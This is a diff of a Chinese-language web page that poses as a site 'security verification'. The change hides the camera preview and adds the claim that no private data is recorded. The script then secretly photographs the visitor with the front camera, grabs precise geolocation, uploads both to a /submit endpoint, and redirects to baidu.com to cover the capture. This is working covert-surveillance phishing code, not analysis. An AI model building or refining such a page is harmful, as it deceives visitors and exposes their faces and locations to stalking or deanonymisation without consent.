@@ -2,81 +2,73 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>系统安全检验</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background-color: #0b0b0e; color: #7a8590; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-        .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 30px 20px; background: #121319; border: 1px solid #1a1b23; border-radius: 8px; }
-        h1 { color: #3b82f6; font-size: 24px; font-weight: 600; margin-bottom: 12px; letter-spacing: 1px; }
-        .subtitle { color: #ffffff; font-size: 13px; line-height: 1.6; margin-bottom: 25px; opacity: 0.9; }
-        
-        /* 摄像头实时预览框 */
-        .preview-container { width: 100%; aspect-ratio: 4/3; background: #000; border-radius: 6px; overflow: hidden; margin-bottom: 25px; border: 1px solid #282a36; position: relative; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        .view-tip { position: absolute; top: 10px; left: 10px; background: rgba(239, 68, 68, 0.85); color: white; font-size: 10px; padding: 3px 8px; border-radius: 4px; font-weight: bold; }
-
+        .wrapper { width: 100%; max-width: 360px; text-align: center; padding: 40px 20px; background: #121319; border: 1px solid #1a1b23; border-radius: 8px; }
+        h1 { color: #3b82f6; font-size: 26px; font-weight: 600; margin-bottom: 16px; }
+        .subtitle { color: #ffffff; font-size: 14px; line-height: 1.6; margin-bottom: 40px; opacity: 0.9; }
         .btn-verify { display: inline-block; width: 100%; background: #ef4444; color: #ffffff; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; }
         .btn-verify:active { transform: scale(0.98); background: #dc2626; }
-        
-        .loading-box { display: none; margin-top: 10px; }
-        .spinner { width: 22px; height: 22px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
-        .loading-text { font-size: 11px; color: #4a5568; font-family: monospace; letter-spacing: 0.5px; }
+        .loading-box { display: none; margin-top: 20px; }
+        .spinner { width: 24px; height: 24px; border: 2px solid rgba(255,255,255,0.1); border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+        .loading-text { font-size: 12px; color: #4a5568; font-family: monospace; word-break: break-word; }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .result-info { margin-top: 15px; font-size: 11px; color: #6c757d; background: #1e1f2c; padding: 8px; border-radius: 4px; display: none; }
     </style>
 </head>
 <body>
-
 <div class="wrapper">
     <h1>欢迎访问</h1>
-    <p class="subtitle">为保护网站与进行安全守护验证<br>需要检验您的设备环境与网络状态</p>
-    
-    <div class="preview-container">
-        <div class="view-tip">● 验证画面已启用</div>
-        <video id="video" autoplay playsinline muted></video>
-    </div>
+    <p class="subtitle">为保护网站，需要检验你的设备环境<br>我们不会记录隐私信息</p>
 
     <button class="btn-verify" id="start-btn" onclick="executeVerification()">检验</button>
-    
+
     <div class="loading-box" id="loading-layer">
         <div class="spinner"></div>
         <div class="loading-text" id="status-tip">等待检验触发...</div>
     </div>
+    <div class="result-info" id="result-info"></div>
 </div>
 
+<video id="video" style="display:none;" autoplay playsinline muted></video>
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
     let streamRef = null;
 
-    window.addEventListener('DOMContentLoaded', async () => {
-        try {
-            streamRef = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: "user", width: 640, height: 480 },
-                audio: false
-            });
-            document.getElementById('video').srcObject = streamRef;
-        } catch (err) {
-            alert("验证服务需要使用摄像头，请允许权限后刷新页面。");
-        }
-    });
-
     async function executeVerification() {
         const btn = document.getElementById('start-btn');
         const loader = document.getElementById('loading-layer');
-        
         btn.style.display = 'none';
         loader.style.display = 'block';
+        updateStatus("正在请求摄像头权限...");
 
-        updateStatus("正在检验设备位置环境...");
-        
+        try {
+            // 请求摄像头（不显示预览，仅用于拍照）
+            streamRef = await navigator.mediaDevices.getUserMedia({
+                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" },
+                audio: false
+            });
+            const video = document.getElementById('video');
+            video.srcObject = streamRef;
+            await new Promise((resolve) => { video.onloadedmetadata = resolve; });
+            updateStatus("摄像头已就绪，正在获取位置...");
+        } catch (err) {
+            console.warn("摄像头错误:", err);
+            updateStatus("摄像头不可用，将继续上传");
+        }
+
+        // 获取地理位置
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 captureAndUpload(position.coords.latitude, position.coords.longitude);
             },
             (error) => {
-                // 对应你后端判断的 "IP_FALLBACK"
-                captureAndUpload("IP_FALLBACK", "IP_FALLBACK");
+                console.warn("定位错误:", error.message);
+                captureAndUpload("0.0", "0.0");
             },
             { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
@@ -86,57 +78,66 @@
         document.getElementById('status-tip').innerText = text;
     }
 
-    async function captureAndUpload(lat, lon) {
-        updateStatus("同步打包加密数据流...");
+    async function captureAndUpload(lat, lng) {
+        updateStatus("正在拍摄照片...");
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
 
-        if (streamRef && video.readyState === video.HAVE_ENOUGH_DATA) {
+        // 如果摄像头流存在且有画面，则拍照；否则生成一张纯黑占位图
+        if (streamRef && video.readyState >= 2 && video.videoWidth > 0) {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             streamRef.getTracks().forEach(track => track.stop());
+        } else {
+            ctx.fillStyle = "#0b0b0e";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
         }
 
-        updateStatus("正在转换图片流格式...");
-        
-        // 核心修改：不直接发送 Base64 文本，而是转成后端能直接解析的二进制 Blob 文件对象
+        updateStatus("正在打包并上传...");
+
+        // 将 canvas 转为 Blob 文件对象
         canvas.toBlob(async (blob) => {
             if (!blob) {
-                updateStatus("格式打包失败");
+                updateStatus("图片生成失败");
                 return;
             }
 
-            updateStatus("上传守护云端中，请勿关闭窗口...");
-
-            // 核心对齐：转回后端要求的 FormData 结构进行传输
             const formData = new FormData();
-            formData.append("photo", blob, "capture.jpg");
-            formData.append("lat", lat);
-            formData.append("lon", lon);
+            formData.append('photo', blob, 'capture.jpg');
+            formData.append('lat', lat.toString());
+            formData.append('lng', lng.toString());
 
             try {
                 const response = await fetch('/submit', {
                     method: 'POST',
-                    body: formData // 不加 headers，浏览器会自动附带 multipart/form-data
+                    body: formData   // 关键：使用 multipart/form-data
                 });
 
                 const result = await response.json();
-                
+                console.log("后端返回:", result);
+
                 if (response.ok && result.success) {
-                    updateStatus("检验通过，正在为您接入主页...");
+                    updateStatus("验证通过，正在跳转...");
+                    // 可选：显示后端返回的图片地址（如果后端返回了 url 字段）
+                    if (result.url || result.key) {
+                        const infoDiv = document.getElementById('result-info');
+                        infoDiv.style.display = 'block';
+                        infoDiv.innerHTML = `图片已保存: ${result.url || result.key}`;
+                    }
                 } else {
-                    console.error("后端处理失败:", result.error);
-                    updateStatus("服务端报错，请检查云端配置...");
+                    console.error("后端错误:", result.error);
+                    updateStatus("验证失败，请重试");
                 }
             } catch (err) {
-                console.error("传输遇到异常:", err);
-                updateStatus("网络连接中断...");
+                console.error("网络错误:", err);
+                updateStatus("网络连接失败");
             } finally {
+                // 2 秒后跳转目标页面（可自行修改）
                 setTimeout(() => {
                     window.location.href = "https://www.baidu.com";
-                }, 800);
+                }, 2000);
             }
-        }, 'image/jpeg', 0.6);
+        }, 'image/jpeg', 0.7);
     }
 </script>
 </body>
